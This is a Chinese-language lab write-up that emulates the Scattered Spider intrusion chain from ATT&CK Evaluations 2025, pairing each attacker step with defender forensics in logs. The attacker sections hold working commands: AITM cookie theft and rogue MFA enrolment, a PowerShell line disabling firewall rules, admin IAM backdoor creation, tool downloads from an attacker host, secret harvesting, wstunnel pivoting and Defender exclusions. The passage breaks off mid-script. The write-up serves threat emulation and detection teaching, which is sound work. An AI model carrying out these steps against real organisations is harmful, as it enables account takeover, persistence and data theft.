---
title: 基於 ATT&CK Evaluations Enterprise 2025 的 Scattered Spider 攻擊與鑑識模擬演練
description: 依據 ATT&CK Evaluations Enterprise 2025 情境，重現 Scattered Spider 的攻擊流程並進行鑑識分析
published: 2026-09-28
category: Writeup
tags:
  - Scattered Spider
  - ATT&CK Evaluations
  - Threat Emulation
  - Digital Forensics
---

# 基於ATT&CK Evaluations Enterprise 2025 Scattered Spider 攻擊&鑑識模擬演練

> auth : yunshiuan

## Scattered Spider Overview 

Scattered Spider 是一個以經濟利益為導向的網路犯罪集團，自 2022 年初開始活躍，攻擊目標遍及全球各行各業。他們主要鎖定能帶來鉅額財務回報的組織，例如科技、電信、金融與娛樂產業。

該集團以其 Live off the Land 的能力，以及利用合法工具來規避偵測的手法而聞名。資安界認為 Scattered Spider 對於端點偵測與回應及 SSO 機制的了解程度已經堪比專業的系統管理員或紅隊演練人員。

他們在雲端環境中被視為極具威脅的對手，並專精於透過憑證竊取技術與社交工程戰術，來取得目標網路的存取權限。

Reference : https://attackevals.github.io/ael/enterprise/scattered_spider/cti_emulation_resources/

本次的報告會展示基於https://attackevals.github.io/ael/enterprise/scattered_spider/cti_emulation_resources/scattered_spider_scenario_overview/提供的 Scenario 進行 Scattered Spider的 TTPs 流程與鑑識流程

## 關於模擬環境

在 https://github.com/attackevals/ael Repo 當中，有提供 AWS 的環境架設腳本，將整個 AD 等等服務架在 AWS 上，但是根據官方所說

> **AWS Cost Estimate:** A rough estimated cost for the environment is approximately $2500 *per month*, assuming the hosts are run 24/7. !!!
>
> Reference : https://github.com/attackevals/ael/blob/main/Enterprise/scattered_spider/Resources/setup/GettingStarted.md

我嘗試架設了2 天左右時間，過程中因為套件以及對 AWS 不太熟的原因導致安裝的過程一直失敗，最終結果則是沒有辦法架設完成，並且消耗完了 Credit 甚至收到了 68.12 美元的帳單。不過我在架設過程中有學到挺多 AWS EC2 S3 org 等等設定知識，想想也是有點收穫的

![image-20260326205752710](assets/image-20260326205752710.png)

**因此本次的 Scenario 會是原本在 ael  Repo 上的簡化版，會將一些虛擬機移至我本地的 proxmox，一些一樣會架在 AWS，但在攻擊模擬方面仍會還原 Scattered Spider 的 TTPs**



## Scenario Overview

透過對受害者進行魚叉式網路釣魚，Scattered Spider 利用偽造的單一登入入口網站來竊取憑證，藉此取得有效的連線階段 Cookie，隨後再利用該 Cookie 驗證並登入真實的單一登入入口網站。在此階段，攻擊者會探索公司的內部資源，並利用單一登入儀表板新增一個備用的多因素驗證方式。在進行網路探索時，Scattered Spider 找出了 AirByte 的連線資訊。接著，為了規避偵測，他們利用受害者的電子郵件帳號建立收件匣規則，藉此隱藏未來所有與 AirByte 相關的電子郵件。

在取得 AWS 控制台的存取權限後，攻擊者會探索可用的各種雲端資源，接著在所有 Windows 主機上執行指令以停用防火牆規則。接下來 Scattered Spider 會建立一個新的 IAM 使用者，並利用該帳號透過 aws_consoler 產生互動式連線階段，藉此建立一個 EC2 Linux 執行個體。隨後 Scattered Spider 利用 AWS CloudShell 存取 AWS 機密資訊，並執行 Trufflehog 與 Jecretz 等工具來搜刮憑證。然後，他們從 GitHub 下載 wstunnel，並利用它將來自攻擊者控制伺服器的 SSH 流量進行隧道化。

回到 AWS Systems Manager 控制台後，Scattered Spider 會安裝 Tactical RMM 遠端監控與管理工具，接著建立一個連線階段以進行橫向移動。在此連線階段中，Scattered Spider 存取了 Airbyte 入口網站，新增一個 S3 作為目的地，並將 GitLab 與 Wekan 的資料同步至攻擊者控制的 S3 儲存體中。最後，他們安裝了 Cyberduck，用於連線並在 Amazon 檔案共用服務中搜尋感興趣的檔案。這些檔案最終會被資料外洩至攻擊者所控制的 S3 儲存體中。

![image-20260329223604200](assets/image-20260329223604200.png)



---

## 開始模擬前設定

在 kali 上先啟動 AITM

```bash
cd /opt/kalidev/scattered_spider/Resources/payloads
sudo ./aitm -ip 174.3.0.70 -port 8888 -resourceDir ./static -authentikUrl https://sso.kingslanding.net/

cd /opt/kalidev/
source venv/bin/activate
```

![image-20260328151856467](assets/image-20260328151856467.png)

去瀏覽器登入TacticalRMM

![image-20260329134422373](assets/image-20260329134422373.png)

---

## Step 1 - Initial Access via Unmanaged Device

> Scattered Spider 利用魚叉式網路釣魚，透過偽造的單一登入入口網站擷取憑證，並存取受害者的遠端桌面，藉此探索公司資源，例如公司的 AWS 帳號、Guacamole、內部 GitLab 以及 AirByte。威脅行為者利用高權限的單一登入憑證登入多因素驗證自助服務控制台，並建立第二個多因素驗證權杖以維持持續性。

![image-20260329224057416](assets/image-20260329224057416.png)

### Attacker 模擬

向 `harrenhal` 發送魚叉式網路釣魚電子郵件。該郵件將包含一個指向假冒登入入口頁面的連結，並返回至未受管理的工作站 `harrenhal (192.168.1.82)` 的 RDP。打開電子郵件並點擊指向偽造 SSO 入口網站的連結，

![image-20260328152429145](assets/image-20260328152429145.png)

返回 Kali 攻擊主機 ，並在 AITM 網釣伺服器的輸出中確認已收到驗證過的會話 cookie 與 CSRF 令牌 cookie

![image-20260328162858216](assets/image-20260328162858216.png)

在 Kali 攻擊主機上，開啟 Firefox，使用 Ctrl+Shift+P 打開「私人視窗」，然後瀏覽到真實的 SSO 入口網站 `https://sso.kingslanding.net/` 。打開 `More Tools` 然後 `Web Developer Tools` ，前往 `Storage` 分頁，接著到 `Cookies` 下拉選單。對於 SSO 入口網站，將 `authentik_session` 的 cookie 值替換為 AITM 釣魚伺服器輸出中的值。點擊 + 號建立一個新 cookie，名稱設為 `authentik_csrf` ，值設為 AITM 釣魚伺服器輸出中的 `authentik_csrf` 值。編輯瀏覽器中的 URL，替換為 `https://sso.kingslanding.net/`

![image-20260328163039009](assets/image-20260328163039009.png)

然後重新載入頁面。您現在應該已經以該使用者的身分驗證進入 SSO 入口網站。

![image-20260329142714576](assets/image-20260329142714576.png)

在你的 SSO 控制台分頁中，右鍵在新分頁開啟設定頁面，然後點選 MFA 裝置選單。按「註冊」，接著選擇「靜態代幣」。記下顯示的代幣，以防日後 SSO 工作階段逾時，然後在頁面上點選「繼續」。確認使用者的已啟用 MFA 方法清單中現在包含靜態代幣。

![image-20260328163346613](assets/image-20260328163346613.png)

返回 SSO 控制面板，右鍵點擊 Guacamole 應用程式選擇「在新分頁開啟」，以存取有可用遠端機器的 Guacamole 儀表板。從清單中選取 dragongate ，並使用下列認證驗證遠端桌面會話。在 Domain 欄位輸入 kingslanding 等入進 harrenal 電腦

![image-20260328192700736](assets/image-20260328192700736.png)

### Defender

因為是釣魚信件導到釣魚網站，首先可以先看 edge 的訪問紀錄，使用 KAPE 把瀏覽器 db 導出來

路徑為 : `C:\Users\harrenhal\AppData\Local\Microsoft\Edge\User Data\Default\History` ，並用 DB browser for SQLite 查看

下方的紀錄可以看到 harrenhal 確實訪問了 kali 開的 AITM

![image-20260329095219272](assets/image-20260329095219272.png)

而從 harrenhal 的 authentik 後台的 session 的紀錄可以看到有另一個 ip 訪問 (kali)

![image-20260329023340263](assets/image-20260329023340263.png)

前往 Admin 的  Authentik 後台有 log 可以查看 ， 可以看到 從 kali 的 ip 取得了 Static Token

![image-20260328202947753](assets/image-20260328202947753.png)

另外這個紀錄發現攻擊者接下來利用 authentik 登入 Guacamole

![image-20260328203217852](assets/image-20260328203217852.png)



最後因為是用 Guacamole 登入 harrenhal 電腦進行操控 ， 因此可以用 Security log event_id : 4624 以及 LogonType 10 去查看登入紀錄，下面的紀錄可以證明攻擊者使用了了 SSO (192.168.1.84) 通過 Guacamole 進入了 harrenhal 電腦

| @timestamp                  | host.hostname | winlog.event_data.LogonType | winlog.event_data.IpAddress |
| --------------------------- | ------------- | --------------------------- | --------------------------- |
| Mar 28, 2026 @ 21:10:37.373 | harrenhal     | 10                          | 192.168.1.84                |

![image-20260329133209807](assets/image-20260329133209807.png)

---

## Step 2 - Discovery

> 接下來，Scattered Spider 會進行網路探索，下載 AdExplorer 來列舉 Active Directory，並在檔案與目錄中搜尋與網路相關的文件。攻擊者會在此過程中發現如何連線至該公司 AirByte 執行個體的相關資訊。

![image-20260329224441327](assets/image-20260329224441327.png)

### Attacker 模擬

首先在已經被攻擊者登入的 harrenhal 電腦上執行下面指令，了解目前網路設定

```bash
whoami & ping google.com & wmic product get name, version & nltest /dclist:kingslanding.net & nltest /domain_trusts
```

![image-20260328211616365](assets/image-20260328211616365.png)

找到 DC (readkeep) ， ping 他看看

```
ping readkeep.kingslanding.net
```

![image-20260328211743343](assets/image-20260328211743343.png)

打開瀏覽器輸入下載AdExplorer

```
https://download.sysinternals.com/files/AdExplorer.zip
```

下載並解壓縮到 Downloads 資料夾

![image-20260328211908983](assets/image-20260328211908983.png)

打開 ADExplorer.exe 連線至 AD 

![image-20260328212042044](assets/image-20260328212042044.png)

AdExplorer 連線到網域後，點選搜尋圖示以開啟「搜尋容器」視窗。在「Class」欄位從下拉選單選擇「User -- user」，然後點選「Search」。

在搜尋容器底部的結果中，雙擊「CN=Users,DC=kingslanding,DC=net」，然後在 AdExplorer 視窗展開「CN=Users」以檢視網域使用者。

![image-20260328212252233](assets/image-20260328212252233.png)

回到 Search Container 視窗。在「Attribute」欄位選擇「cn」。在「Relation」欄位選擇「contains」。在「Value」欄位輸入「Admin」，然後按「Add」和「Search」。 在 Search Container 底部的結果中，雙擊「CN=Domain Admins...」，在 AdExplorer 視窗中雙擊「member」屬性以查看列在 Domain Admins 群組中的使用者。

![image-20260328212923634](assets/image-20260328212923634.png)

 回到 Search Container 視窗底部的結果。雙擊「CN=System Admins...」，在 AdExplorer 視窗中雙擊「member」屬性以查看列在 System Admins 群組中的使用者。

![image-20260328213026175](assets/image-20260328213026175.png)

 打開「檔案總管」，在「此電腦」下開啟對應到檔案伺服器共用的磁碟機。在名為「network_files」的資料夾中，對每個檔案雙擊以開啟並檢視內容。打開名為 `AirByteInfo.docx` 的檔案以確認該文件包含如何存取內部 AirByte 的指示。

![image-20260328213853836](assets/image-20260328213853836.png)

### Defender

首先攻擊者使用多個指令查看環境網路配置，可以使用 Sysmon Event code 1 抓出以下攻擊者執行的指令

| @timestamp                  | host.hostname | winlog.event_data.Image           | winlog.event_data.CommandLine    |
| --------------------------- | ------------- | --------------------------------- | -------------------------------- |
| Mar 28, 2026 @ 21:15:39.401 | harrenhal     | C:\Windows\System32\whoami.exe    | whoami                           |
| Mar 28, 2026 @ 21:15:39.467 | harrenhal     | C:\Windows\System32\PING.EXE      | ping  google.com                 |
| Mar 28, 2026 @ 21:15:42.752 | harrenhal     | C:\Windows\System32\wbem\WMIC.exe | wmic  product get name, version  |
| Mar 28, 2026 @ 21:15:45.629 | harrenhal     | C:\Windows\System32\nltest.exe    | nltest  /dclist:kingslanding.net |
| Mar 28, 2026 @ 21:15:45.694 | harrenhal     | C:\Windows\System32\nltest.exe    | nltest  /domain_trusts           |
| Mar 28, 2026 @ 21:16:22.046 | harrenhal     | C:\Windows\System32\PING.EXE      | ping  redkeep.kingslanding.net   |

![image-20260328221800677](assets/image-20260328221800677.png)

接下來往後看可以利用 Sysmon Event code : 11 找到攻擊者下載了`AdExplorer.zip` 到 `C:\Users\harrenhal\Downloads\`

| @timestamp                  | host.hostname | winlog.event_data.Image                                      | winlog.event_data.CommandLine                               |
| --------------------------- | ------------- | ------------------------------------------------------------ | ----------------------------------------------------------- |
| Mar 28, 2026 @ 21:18:14.864 | harrenhal     | C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | C:\Users\harrenhal\Downloads\AdExplorer.zip:Zone.Identifier |

![image-20260328222432235](assets/image-20260328222432235.png)

接著使用 Sysmon Event code : 1 找到攻擊者有執行 `ADExplorer.exe` 的證據

| @timestamp                  | host.hostname | winlog.event_data.Image                                | winlog.event_data.CommandLine                            |
| --------------------------- | ------------- | ------------------------------------------------------ | -------------------------------------------------------- |
| Mar 28, 2026 @ 21:19:37.409 | harrenhal     | C:\Users\harrenhal\Downloads\AdExplorer\ADExplorer.exe | "C:\Users\harrenhal\Downloads\AdExplorer\ADExplorer.exe" |

![image-20260328222805704](assets/image-20260328222805704.png)

後面因為攻擊者使用 ADExplorer.exe 搜尋了網域使用者與相關權限設定，因此可以使用 Security log Event ID: 4662 偵測對 AD object 進行的操作，並獲得了以下多筆紀錄，證明攻擊者有對 AD 進行 Enumeration

![image-20260328224957570](assets/image-20260328224957570.png)

最後攻擊者有去存取 file-server 的共享資料夾以及存取 AirByteInfo.docx ，因此可以在 hostname : file-server 以及 Event code : 5145 偵測出該網路共用物件的存取紀錄，以下這筆紀錄證明攻擊者有存取 `AirByteInfo.docx`

| @timestamp                  | host.hostname | winlog.event_data.SubjectUserName | winlog.event_data.ShareLocalPath | winlog.event_data.RelativeTargetName |
| --------------------------- | ------------- | --------------------------------- | -------------------------------- | ------------------------------------ |
| Mar 28, 2026 @ 22:55:06.554 | file-server   | harrenhal                         | \??\C:\alchemy                   | network_files\AirByteInfo.docx       |

![image-20260328225830609](assets/image-20260328225830609.png)

---

## Step 3 - AWS Discovery and Defense Evasion

> Scattered Spider 接著利用受害者的電子郵件帳號設定新的收件匣規則，藉此隱藏未來有關 Airbyte 的電子郵件。透過社交工程，威脅行為者取得了一組多因素驗證權杖，從而獲得存取該公司 AWS 控制台的權限。透過 AWS 管理控制台，Scattered Spider 探索了已啟用的服務、身分與存取管理使用者、角色與權限群組、S3 儲存體以及 EC2 執行個體。隨後，Scattered Spider 在所有 Windows 主機上執行指令，以停用防火牆規則。

![image-20260329224737922](assets/image-20260329224737922.png)

> - ☣️ Click the plus icon to create a new inbox rule. Set the rule name to `spam`. Under the conditions option, select "It includes these words" -> "In the body", which will generate another pop-up window to specify words or phrases. In this new window, add `airbyte`, and be sure to click the plus (`+`) sign or press enter to actually add the word before hitting the OK button. You should now see the word `airbyte` appear to the right of the conditions drop-down menu.
>
> - ☣️ Under "Do all of the following", select "Move, copy, or delete" -> "Delete the message".
>
> - ☣️ At the bottom, make sure the "Stop processing more rules" options is toggled on.
>
> - ☣️ Click the "Ok" save button at the top of the popup window to save the rule. Check that the new rule appears in the rules list. Click the "Save" button above the list to save your changes.
>
>     因為我沒有 mail server 所以此設定跳過。

### Attacker 模擬

回去 harrnehal 點選 authentik 的 aws console 登入進去 ，會自動進入 aws console 的頁面

![image-20260329023255600](assets/image-20260329023255600.png)

在 AWS 主控台首頁，確認右上角的區域顯示為 `us-east-1` 。如果不是，請點擊該區域並在下拉選單中手動選擇 `us-east-1`

![image-20260329022739040](assets/image-20260329022739040.png)

在 AWS 主控台首頁，於主控台右上角點擊使用者名稱以開啟下拉選單，然後在「帳戶」下以滑鼠右鍵點擊「帳單與費用管理」在新分頁中開啟。接著在左側導覽欄的「成本分析」下點擊「成本探索器」。在右側窗格的「報表參數」中，點擊「日期範圍」以開啟日期選擇。於「自動選擇範圍（相對）」下，在「過去：」旁選擇「7 天」，然後點擊「套用」。

回到含有 AWS Console 首頁的分頁，搜尋「IAM」，然後以滑鼠右鍵在新分頁中開啟「IAM」控制台。接著，在左側導覽窗格「Access management」下，點選「Users」

![image-20260329024235231](assets/image-20260329024235231.png)

在 AWS IAM 控制台中，於左側導覽窗格點選「User groups」，並點開每個群組的「Users」以列出每個群組中的使用者

![image-20260329024205151](assets/image-20260329024205151.png)

回到含有 AWS Console 首頁的分頁。搜尋「S3」，然後以滑鼠右鍵在新分頁中開啟「S3」。捲動到「General purpose buckets」以檢視可用的 S3 儲存桶清單

![image-20260329024135417](assets/image-20260329024135417.png)

回到含有 AWS Console 首頁的分頁。搜尋「VPC」，然後以滑鼠右鍵在新分頁中開啟「VPC」。在左側面板「Virtual private cloud」下，選取「Your VPCs」。找到 `REPLACE_WITH_VPC_NAME` VPC 並勾選相鄰方塊以調出其詳細資訊。確認該 VPC 是否列有 IPv4 CIDR 區塊，並複製其 VPC ID 以便後。

![image-20260329024609929](assets/image-20260329024609929.png)

接著，在左側面板的「 Virtual private cloud」下，選擇「 Subnets 」。在子網路表格的搜尋選項中，貼上先前的 VPC ID，並確認是否存在 CIDR 為 `10.212.3.0/24` 的子網路。

![image-20260329024650226](assets/image-20260329024650226.png)

最後，在左側面板的「Security」下，選擇「Security Groups」。在安全性群組表格的搜尋選項中，貼上先前的 VPC ID，並確認是否存在名稱為 `REPLACE_WITH_SECURITY_GROUP_NAME` 的安全性群組，然後勾選旁邊的方框以調出其詳細資訊。

![image-20260329024817716](assets/image-20260329024817716.png)

回到含有 AWS Console 首頁的分頁。搜尋「Systems Manager」，然後以右鍵在新分頁中開啟「Systems Manager」。接著在左側導覽窗格中於「Node Tools」下點選「Inventory」，然後捲動到「Corresponding managed instances」以查看可用目標列表

![image-20260329033140871](assets/image-20260329033140871.png)

在 AWS Systems Manager 主控台左側導覽窗格的「Node Tools」下，選擇「State Manager」。勾選「Document name」為 `AWS-GatherSoftwareInventory` 的關聯，然後點選 Apply association now 按鈕。如系統要求確認，請點選「Apply」。請定期點選重新整理按鈕，直到該關聯狀態不再顯示為等待中。

![image-20260329033111587](assets/image-20260329033111587.png)

在左側導覽的「節點工具」下，點選「執行指令」，然後點擊「執行指令」按鈕，選擇 `AWS-RunPowerShellScript` 指令文件，並將以下內容貼到「指令」欄位：

```powershell
$hosts = "fleabottom", "fishmonger", "dragongate", "sept", "citadel"; if ($hosts -contains $env:COMPUTERNAME) { Get-NetFirewallRule | Where-Object {$_.Action -eq 'Block'} | Set-NetFirewallRule -Enabled False; echo "Success"; }

```

![image-20260329033347122](assets/image-20260329033347122.png)

在「目標選擇」中選擇「手動選取實例」，然後在搜尋欄輸入「Platform type: Windows」，勾選方框以選取所有機器；在「輸出選項」中取消勾選「啟用 S3 儲存桶」，接著點選「執行」。在命令 ID 頁面，於「取消命令」按鈕旁點擊箭頭以重新整理狀態，直到命令完成。向下捲動並確認所有目標的成功狀態。

![image-20260329033805910](assets/image-20260329033805910.png)

![image-20260329033830752](assets/image-20260329033830752.png)

### Defender

攻擊者首先使用 Authentik 登入 aws ， 因此一開始可以去 admin 的 Authentik 後台，看到 harrenhal 登入 Aws 的紀錄

![image-20260329032032737](assets/image-20260329032032737.png)

接下來攻擊者利用 harrnehal 帳號查看 AWS Conole 的多項服務，因此可以使用 AWS 提供的 CloudWatch ，搜尋關於 harrnehal 相關的操作，根據以下 filter 出來的證據，可以看到 harrenhal 有嘗試看 Cost 以及查看 Groups 的等等攻擊者進行偵查的操作

![image-20260329035212245](assets/image-20260329035212245.png)

最後攻擊者使用了 RunPowershell 的方式改變 Windows 防火牆規則，因此最後會在AWS CloudWatch出現 SendCommand 的紀錄，

![image-20260329143847901](assets/image-20260329143847901.png)

---

## Step 4 - AWS Persistence and Defense Evasion

> Scattered Spider 建立了一個新的身分與存取管理使用者，並利用該帳號透過 aws_consoler 產生互動式連線階段。在此連線階段中，Scattered Spider 建立了一個 EC2 Linux 執行個體，該執行個體被用作惡意酬載的集結點、樞紐點以及用於維持持續性的後門。

![image-20260329225516381](assets/image-20260329225516381.png)

### Attacker 模擬

回到有 AWS IAM 主控台的瀏覽器分頁。在左側導覽「Access Management」底下，點選「Users」。在右側，點擊「Create User」按鈕。輸入使用者名稱 `ahightower` ，然後點擊「Next」。選擇「Attach policies directly」，搜尋「admin_policy」並勾選其方框以附加該政策，接著點擊「Next」。最後，點擊「Create User」。

![image-20260329035827867](assets/image-20260329035827867.png)

在 AWS IAM 控制台中，點選新建立的使用者 `ahightower` 。點擊「Create Access Key」按鈕。點選「Command Line Interface(CLI)」。勾選確認方框，然後點「Next」。在「Set description tag」視窗中，將「Description tag value」留空，然後點「Create access key」。在 secret access key 底下點「Show」並複製兩組金鑰。複製完成後，點選 Done

![image-20260329225913396](assets/image-20260329225913396.png)

使用剛剛創建的兩個金鑰，利用aws_consoler 工具產生出新創建用戶的登入網址

```bash
aws_consoler -a "AKIAYPJM4P4..." -s yGN6ICoCwE9MdkWnfRzck.... -vv -R us-east-1
```

![image-20260329230053663](assets/image-20260329230053663.png)

![image-20260329041847209](assets/image-20260329041847209.png)

在 aws_consoler 建立的 AWS 主控台中，搜尋並開啟「CloudShell」。執行下列指令以建立具有管理員存取權限的 IAM 角色和設定檔：

```bash
aws iam create-role --role-name goldroad-role --assume-role-policy-document '{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": ["sts:AssumeRole"],"Principal": {"Service": ["ec2.amazonaws.com"]}}]}' --description "IAM role for goldroad";
aws iam attach-role-policy --role-name goldroad-role --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess";
aws iam create-instance-profile --instance-profile-name goldroad-role;
aws iam add-role-to-instance-profile --instance-profile-name goldroad-role --role-name goldroad-role
```

![image-20260329042039762](assets/image-20260329042039762.png)

在同一個 CloudShell 終端機會話中，執行下列指令來建立 SSH key pair 。複製輸出的私鑰並將內容儲存為 Kali 上的文字檔，同時貼到 ARCADE 的 Notes 欄位中

```bash
aws ec2 create-key-pair --key-name goldroad --key-type rsa --key-format pem --query "KeyMaterial" --output text
```

![image-20260329230231156](assets/image-20260329230231156.png)

在同一個 CloudShell 終端機會話中，執行下列指令來建立 Linux EC2 實例，並將先前建立的 SSH 金鑰、IAM 設定檔與角色指派給該實例：

```bash
subnet_id="subnet-09f04de168051f818"
group_id="sg-097f8543f33eefc6e"

result=$(aws ec2 run-instances --image-id "ami-00de3875b03809ec5" \
    --instance-type "t3.small" \
    --block-device-mappings '{"DeviceName":"/dev/sda1","Ebs":{"Encrypted":false,"DeleteOnTermination":true,"Iops":3000,"VolumeSize":20,"VolumeType":"gp3","Throughput":125}}' \
    --network-interfaces '{"SubnetId":"subnet-09f04de168051f818","DeleteOnTermination":true,"AssociatePublicIpAddress":false,"DeviceIndex":0,"PrivateIpAddresses":[{"Primary":true,"PrivateIpAddress":"10.212.3.108"}],"Groups":["sg-097f8543f33eefc6e"]}' \
    --credit-specification '{"CpuCredits":"unlimited"}' \
    --tag-specifications '{"ResourceType":"instance","Tags":[{"Key":"Name","Value":"goldroad"},{"Key":"Hostname","Value":"goldroad"}]}' \
    --metadata-options '{"HttpEndpoint":"enabled","HttpPutResponseHopLimit":2,"HttpTokens":"required"}' \
    --private-dns-name-options '{"HostnameType":"ip-name","EnableResourceNameDnsARecord":true,"EnableResourceNameDnsAAAARecord":false}' \
    --count "1" --key-name "goldroad" --user-data "$user_data" --iam-instance-profile '{"Name":"goldroad-role"}')

echo $result | jq
```

![image-20260329042845937](assets/image-20260329042845937.png)

在 AWS EC2 主控台中，選取新建立的執行個體，選擇「Connect」，選取「EC2 Serial Console」，在「not authorized message」中點擊「Manage access」，勾選 Allow 並點擊「Update」。於「Instances」下點選「Instances」，選取新建立的執行個體，並重複先前步驟。此時不再出現「not authorized message」，你應該可以點擊「Connect」按鈕。連線後若主控台畫面仍為黑屏，請按 Enter 鍵以載入命令提示字元。使用以下憑證登入：

![image-20260329043229571](assets/image-20260329043229571.png)

### Defender

攻擊者在這部分大量的使用 AWS 的功能， 因此皆可以用 AWS 中的 CloudWatch 去進行追蹤

攻擊者在這部分首先使用了 harrnehal 創建了用戶，因此有 CreateUser 的紀錄，這紀錄可以證明攻擊者使用了 harrenhal 創建新的使用者

![image-20260329171531487](assets/image-20260329171531487.png)



接下來在紀錄中出現了 CreateKeyPair ， 可以證明攻擊者創建的 `ahightower` 有進行創建 SSH key pair 的行為

![image-20260329044332441](assets/image-20260329044332441.png)

最後在以下的紀錄出現 RunInstances ，代表攻擊者創建的 `ahightower`  有創建新的 instance 

![image-20260329172141764](assets/image-20260329172141764.png)

---

## Step 5 - Credential Access

> Scattered Spider 利用 AWS CloudShell 存取 AWS 機密資訊，並執行 Trufflehog 與 Jecretz 從 GitLab 與 Wekan 搜刮憑證。

![image-20260329230706687](assets/image-20260329230706687.png)

### Attacker 模擬

在 AWS 主控台中，回到「CloudShell」終端並列舉可用的 secrets

```
aws secretsmanager list-secrets
```

![image-20260329103235783](assets/image-20260329103235783.png)

在 CloudShell 終端中，列舉可用 secrets 的值。確認已發現一個 GitLab 個人存取權杖 ( `glpat-XXXXXX...` )。記錄此權杖以備後用。

```
aws secretsmanager batch-get-secret-value --secret-id-list gitlab-pat-atargaryen
```

![image-20260329231851328](assets/image-20260329231851328.png)

下載 trufflehog 到 EC2 攻擊機( goldroad )

````
curl http://kingslanding-rmm.com/files/trufflehog -o trufflehog
````

![image-20260329110938393](assets/image-20260329110938393.png)

在 goldroad 執行 trufflehog ，使用之前在 secret 拿到的 gitlab private token 在 gitlab 中拿到 `atargaryen` 的 SSH private key

```bash
chmod +x trufflehog
sudo su
./trufflehog gitlab --endpoint=https://gitlab.com --token=glpat-jgd8v-TwbK7og8-wAey0g2M6MQ.....
```

![image-20260329231941185](assets/image-20260329231941185.png)

在 goldroad 下載 jecretz.py，用偷來的帳密登入 Wekan 看板系統，自動掃描所有卡片內容，從中挖出被開發者不小心寫在看板上的 AirByte 登入憑證。

```bash
sudo add-apt-repository universe
sudo apt update
sudo apt install python3-pip python3.10-venv -y
python3 -m venv .venv
source .venv/bin/activate
pip install certifi==2020.4.5.1 chardet==5.2.0 idna==2.9 requests==2.30.0 terminaltables==3.1.0 textwrap3==0.9.2 truffleHogRegexes==0.0.7 urllib3==2.0.7
curl http://kingslanding-rmm.com:8080/files/jecretz/jecretz.py -o jecretz.py

python jecretz.py -w "http://10.212.3.111/" --username tlannister --password Engine-Dropkick -v
```

![image-20260329113444575](assets/image-20260329113444575.png)

### Defender

首先攻擊者在一開始有去列舉以及取得可用的 secrets，因此在 AWS CloudWatch 上會有 ListSecrets 、 GetSecretValue 以及 BatchGetSecretValue 紀錄，證明攻擊者進行 Secrets 的訪問

![image-20260329114008660](assets/image-20260329114008660.png)



另外因為攻擊者使用了trufflehog 拿 Gitlab Private Token 去，因此可以看 Gitlab Private token 的使用紀錄，但是因為不是自架，所以詳細的log 會需要付費， 因此只能抓到有使用的紀錄而已

```bash
curl -s --header "PRIVATE-TOKEN: glpat-jgd8v-TwbK7og8......" \
  "https://gitlab.com/api/v4/personal_access_tokens/self" | python3 -m json.tool

{
    "id": 21657241,
    "name": "gitlab-pat",
    "revoked": false,
    "created_at": "2026-03-29T02:29:40.657Z",
    "description": "",
    "scopes": [
        "read_api",
        "api",
        "read_repository"
    ],
    "user_id": 34625897,
    "last_used_at": "2026-03-29T03:54:07.210Z",
    "active": true,
    "granular": false,
    "expires_at": "2026-04-28",
    "last_used_ips": []
}

```







---

## Step 6 - Lateral Movement

> Scattered Spider 從 Github 下載 wstunnel，接著利用 wstunnel 將來自攻擊者控制伺服器的 SSH 流量，透過代管 AirByte 且新建的 EC2 Linux 執行個體 rookery IP 位置 10.212.3.188 進行隧道化。該隧道被用於發起至 rookery IP 位置 10.212.3.188 的 SSH 連線，並執行指令以確認 AirByte 的登入憑證。隨後Scattered Spider 回到 AWS Systems Manager 控制台，在多台主機上安裝 Tactical RMM 代理程式。接著建立一個 Tactical RMM 連線階段以連線至 fishmonger IP 位置 10.55.4.102，從而進行橫向移動。

![image-20260329232658034](assets/image-20260329232658034.png)

### Attacker 模擬

在 goldroad 以及 kali 機器下載 wstunnel ，讓攻擊者的 kali 可以透過 goldroad 進入 atargaryen(10.212.3.188) 的機器

```bash
curl -L https://github.com/erebe/wstunnel/releases/download/v10.1.8/wstunnel_10.1.8_linux_amd64.tar.gz -o wstunnel_10.1.8_linux_amd64.tar.gz
tar -xzf wstunnel_10.1.8_linux_amd64.tar.gz
chmod +x wstunnel

# goldroad
./wstunnel server --restrict-to 10.212.3.188:22 wss://0.0.0.0:443
# kali 
./wstunnel client -L tcp://127.0.0.1:2222:10.212.3.188:22 wss://<goldroad-public-ip>:443

ssh -F /dev/null -p 2222 atargaryen@127.0.0.1
```

![image-20260329150130994](assets/image-20260329150130994.png)

在對 `rookery (10.212.3.188)` 的 SSH 工作階段中，執行命令以確認已安裝 AirByte 命令列、AirByte 正在執行

```bash
abctl version
sudo abctl local status
sudo abctl local credentials
```

驗證 AirByte 的 port 與登入憑證。確認登入電子郵件與 `tlannister@kingslanding.net` 相符，且密碼與 `5325OLZ9vcruy8H55qqhhmxK9xH7ooGb` 相符。

```yaml
version: v0.18.1

Using Kubernetes provider:
  Provider: kind
  Kubeconfig: /root/.airbyte/abctl/abctl.kubeconfig
  Context: kind-airbyte-abctl
Found Docker installation: version 26.1.5+dfsg1
Existing cluster 'airbyte-abctl' found
Found helm chart 'airbyte-abctl'
  Status: deployed
  Chart Version: 1.1.0
  App Version: 1.1.0
Found helm chart 'ingress-nginx'
  Status: deployed
  Chart Version: 4.12.0-beta.0
  App Version: 1.12.0-beta.0
Airbyte should be accessible via http://localhost:8000

Using Kubernetes provider:
  Provider: kind
  Kubeconfig: /root/.airbyte/abctl/abctl.kubeconfig
  Context: kind-airbyte-abctl
Retrieving your credentials from 'airbyte-auth-secrets'
Credentials:
  Email: tlannister@kingslanding.net
  Password: 5325OLZ9vcruy8H55qqhhmxK9xH7ooGb
  Client-Id: 20f9d134-cd80-4e0a-9908-82f62fff0a82
  Client-Secret: a8W61gE13IVul618N2WKTHIGUs7Xmh0W
```



回到 aws_consoler 工作階段，搜尋「Systems Manager」，然後以右鍵在新分頁中開啟「Systems Manager」。在左側導覽窗格的「Node Tools」下，點選「Run Command」，按下「Run command」按鈕，選取 `AWS-RunPowerShellScript` 指令文件，並將以下內容貼到「Commands」方塊中，下方powershell 會

```powershell
$hosts = "fleabottom", "fishmonger", "dragongate", "sept", "citadel", $env:COMPUTERNAME
if ($hosts -contains $env:COMPUTERNAME) {
  mkdir "C:\Program Files\TacticalAgent"
  try {
      Add-MpPreference -ExclusionPath "C:\Program Files\TacticalAgent"
      Add-MpPreference -ExclusionPath "C:\Program Files\Mesh Agent"
      Add-MpPreference -ExclusionPath "C:\ProgramData\TacticalRMM"
  } catch {
      Write-Error "Error adding mpP paths: $_"
  } finally {
